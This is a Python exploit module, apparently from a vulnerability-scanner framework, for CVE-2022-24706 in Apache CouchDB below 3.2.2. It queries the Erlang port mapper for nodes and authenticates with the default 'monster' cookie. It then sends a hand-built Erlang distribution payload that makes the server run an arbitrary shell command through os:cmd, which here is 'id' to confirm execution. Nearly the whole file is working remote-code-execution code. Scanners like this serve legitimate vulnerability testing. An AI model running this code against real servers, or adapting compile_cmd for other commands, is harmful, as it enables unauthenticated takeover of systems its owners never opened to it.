import socket
import re
import hashlib
import struct
from urllib.parse import urlparse


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''In Apache CouchDB < 3.2.2 - RCE''',
        "description": '''In Apache CouchDB prior to 3.2.2, an attacker can access an improperly secured default installation without authenticating and gain admin privileges. The CouchDB documentation has always made recommendations for properly securing an installation, including recommending using a firewall in front of all CouchDB installations.''',
        "severity": "medium",
        "references": [
            "https://habr.com/ru/post/661195/", 
            "https://nvd.nist.gov/vuln/detail/CVE-2022-24706"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cvss-score": "9.8",
            "cve-id": "CVE-2022-24706",
            "cwe-id": "CWE-1188"
        },
        "metadata":{
            "vuln-target": '''docker run --rm -p 5984:5984 -p 4369:4369 -p 9100:9100 -d -e NODENAME=test -e 'ERL_FLAGS=-setcookie "monster"' couchdb:2.3.0''',
            
        },
        "tags": ["cve", "cve2022", "couchdb", "epmd", "rce"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    o = urlparse(url)
    target = o.hostname
    EPMD_PORT = 4369
    COOKIE = "monster" # Default Erlang cookie for CouchDB 
    ERLNAG_PORT = 0
    EPM_NAME_CMD = b"\x00\x01\x6e" # Request for nodes list

    # Some data:
    NAME_MSG  = b"\x00\x15n\x00\x07\x00\x03\x49\x9cAAAAAA@AAAAAAA"
    CHALLENGE_REPLY = b"\x00\x15r\x01\x02\x03\x04"

    try:
        # Connect to EPMD:
        try:
            epm_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            epm_socket.connect((target, EPMD_PORT))
        except:
            return result
            
        epm_socket.send(EPM_NAME_CMD) #request Erlang nodes
        if epm_socket.recv(4) == b'\x00\x00\x11\x11': # OK
            data = epm_socket.recv(1024)
            data = data[0:len(data) - 1].decode('ascii')
            data = data.split("\n")
            if len(data) == 1:
                choise = 1
                # print("Found " + data[0])
            else:
                # print("\nMore than one node found, choose which one to use:")
                line_number = 0
                for line in data:
                    line_number += 1
                    # print(" %d) %s" %(line_number, line))
                choise = int(input("\n> "))
                
            ERLNAG_PORT = int(re.search("\d+$",data[choise - 1])[0])
        else:
            return result
        epm_socket.close()

        # Connect to Erlang port:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, ERLNAG_PORT))
        except:
            return result

        s.send(NAME_MSG)
        s.recv(5)                    # Receive "ok" message
        challenge = s.recv(1024)     # Receive "challenge" message
        challenge = struct.unpack(">I", challenge[9:13])[0]


        # Add Challenge Digest
        CHALLENGE_REPLY += hashlib.md5(bytes(COOKIE, "ascii")
            + bytes(str(challenge), "ascii")).digest()
        s.send(CHALLENGE_REPLY)
        CHALLENGE_RESPONSE = s.recv(1024)

        if len(CHALLENGE_RESPONSE) == 0:
            # print("Authentication failed, exiting")
            return result

        s.send(compile_cmd("id"))
        data_size = struct.unpack(">I", s.recv(4))[0] # Get data size
        s.recv(45)              # Control message
        data_size -= 45
        data = s.recv(1024 if data_size > 1024 else data_size)
        data_text = data.decode()
        
        if "uid=" in data_text and "gid=" in data_text:
            result["success"] = True
            result["info"] = info()
            result["payload"] = "{}:{}".format(target, EPMD_PORT)

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url

def compile_cmd(CMD):
    CTRL_DATA = b"\x83h\x04a\x06gw\x0eAAAAAA@AAAAAAA\x00\x00\x00\x03"
    CTRL_DATA += b"\x00\x00\x00\x00\x00w\x00w\x03rex"
    
    MSG  = b"\x83h\x02gw\x0eAAAAAA@AAAAAAA\x00\x00\x00\x03\x00\x00\x00"
    MSG += b"\x00\x00h\x05w\x04callw\x02osw\x03cmdl\x00\x00\x00\x01k"
    MSG += struct.pack(">H", len(CMD))
    MSG += bytes(CMD, 'ascii')
    MSG += b'jw\x04user'
    PAYLOAD = b'\x70' + CTRL_DATA + MSG
    PAYLOAD = struct.pack('!I', len(PAYLOAD)) + PAYLOAD
    
    return PAYLOAD